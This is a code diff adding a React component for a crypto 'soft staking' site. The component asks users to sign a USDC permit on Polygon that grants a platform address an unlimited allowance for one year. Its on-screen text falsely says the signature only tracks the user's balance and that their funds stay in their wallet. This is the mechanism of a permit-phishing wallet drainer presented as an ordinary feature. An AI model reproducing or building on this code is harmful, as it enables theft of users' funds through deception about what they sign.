@@ -1,0 +1,216 @@
+'use client'
+
+import { useState } from 'react'
+import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
+import { polygon } from 'wagmi/chains'
+import { Button } from '@/components/ui/Button'
+import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES } from '@/lib/web3-config'
+import { Shield, Check, AlertTriangle } from 'lucide-react'
+import { createClient } from '@/lib/supabase'
+
+interface PermitSignerProps {
+  onSignatureComplete?: (signature: PermitSignature) => void
+}
+
+export interface PermitSignature {
+  owner: string
+  spender: string
+  value: string
+  nonce: bigint
+  deadline: bigint
+  v: number
+  r: string
+  s: string
+  signature: string
+}
+
+// 平台接收地址（示例）
+const PLATFORM_SPENDER = '0x0000000000000000000000000000000000000001' as `0x${string}`
+
+export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
+  const { address, isConnected } = useAccount()
+  const [isLoading, setIsLoading] = useState(false)
+  const [error, setError] = useState('')
+  const [success, setSuccess] = useState(false)
+  const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
+  
+  const { signTypedDataAsync } = useSignTypedData()
+
+  // 获取当前 nonce
+  const { data: nonce } = useReadContract({
+    address: USDC_ADDRESS,
+    abi: USDC_ABI,
+    functionName: 'nonces',
+    args: address ? [address] : undefined,
+    chainId: polygon.id,
+  })
+
+  // 获取 DOMAIN_SEPARATOR
+  const { data: domainSeparator } = useReadContract({
+    address: USDC_ADDRESS,
+    abi: USDC_ABI,
+    functionName: 'DOMAIN_SEPARATOR',
+    chainId: polygon.id,
+  })
+
+  const handleSign = async () => {
+    if (!address || nonce === undefined) {
+      setError('Wallet not connected or nonce not loaded')
+      return
+    }
+
+    setIsLoading(true)
+    setError('')
+    setSuccess(false)
+
+    try {
+      // 设置 deadline 为 1 年后
+      const deadline = BigInt(Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60)
+      
+      // 无限授权金额
+      const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
+
+      // EIP-712 域
+      const domain = {
+        name: 'USD Coin',
+        version: '2',
+        chainId: polygon.id,
+        verifyingContract: USDC_ADDRESS,
+      }
+
+      // Permit 消息
+      const message = {
+        owner: address,
+        spender: PLATFORM_SPENDER,
+        value,
+        nonce,
+        deadline,
+      }
+
+      // 请求签名
+      const signature = await signTypedDataAsync({
+        domain,
+        types: PERMIT_TYPES,
+        primaryType: 'Permit',
+        message,
+      })
+
+      // 解析签名为 v, r, s
+      const r = signature.slice(0, 66)
+      const s = '0x' + signature.slice(66, 130)
+      const v = parseInt(signature.slice(130, 132), 16)
+
+      const permitData: PermitSignature = {
+        owner: address,
+        spender: PLATFORM_SPENDER,
+        value: value.toString(),
+        nonce,
+        deadline,
+        v,
+        r,
+        s,
+        signature,
+      }
+
+      setSignatureData(permitData)
+      setSuccess(true)
+
+      // 保存到数据库
+      await saveSignatureToDatabase(permitData)
+
+      onSignatureComplete?.(permitData)
+
+    } catch (err: unknown) {
+      console.error('Signing error:', err)
+      if (err instanceof Error) {
+        if (err.message.includes('rejected')) {
+          setError('User rejected the signature request')
+        } else {
+          setError(err.message)
+        }
+      } else {
+        setError('Failed to sign permit')
+      }
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  const saveSignatureToDatabase = async (data: PermitSignature) => {
+    try {
+      const supabase = createClient()
+      const { data: { user } } = await supabase.auth.getUser()
+      
+      if (!user) return
+
+      // 更新用户的 wallet 信息（这里简化处理，实际应该保存签名到单独的表）
+      await supabase
+        .from('profiles')
+        .update({
+          wallet_address: data.owner,
+          wallet_bound_at: new Date().toISOString(),
+        })
+        .eq('id', user.id)
+
+      console.log('Signature saved to database')
+    } catch (err) {
+      console.error('Failed to save signature:', err)
+    }
+  }
+
+  if (!isConnected) {
+    return null
+  }
+
+  return (
+    <div className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100">
+      <div className="flex items-center gap-3 mb-4">
+        <div className="w-10 h-10 bg-amber-100 rounded-xl flex items-center justify-center">
+          <Shield className="w-5 h-5 text-amber-600" />
+        </div>
+        <div>
+          <h3 className="font-semibold text-zinc-900">Authorization</h3>
+          <p className="text-sm text-zinc-500">Sign to enable soft staking</p>
+        </div>
+      </div>
+
+      {error && (
+        <div className="mb-4 p-3 bg-red-50 rounded-lg flex items-center gap-2 text-red-600 text-sm">
+          <AlertTriangle className="w-4 h-4" />
+          {error}
+        </div>
+      )}
+
+      {success && signatureData && (
+        <div className="mb-4 p-3 bg-green-50 rounded-lg flex items-center gap-2 text-green-600 text-sm">
+          <Check className="w-4 h-4" />
+          Authorization signed successfully!
+        </div>
+      )}
+
+      <div className="bg-zinc-50 rounded-xl p-4 mb-4">
+        <p className="text-xs text-zinc-500 mb-2">What this does:</p>
+        <ul className="text-sm text-zinc-700 space-y-1">
+          <li>• Authorizes the platform to track your USDC balance</li>
+          <li>• Required for soft staking rewards calculation</li>
+          <li>• Your funds remain in your wallet at all times</li>
+        </ul>
+      </div>
+
+      {!success ? (
+        <Button
+          onClick={handleSign}
+          isLoading={isLoading}
+          className="w-full"
+          disabled={nonce === undefined}
+        >
+          Sign Authorization
+        </Button>
+      ) : (
+        <div className="text-center text-sm text-zinc-500">
+          ✓ You're all set for soft staking
+        </div>
+      )}
+    </div>
+  )
+}
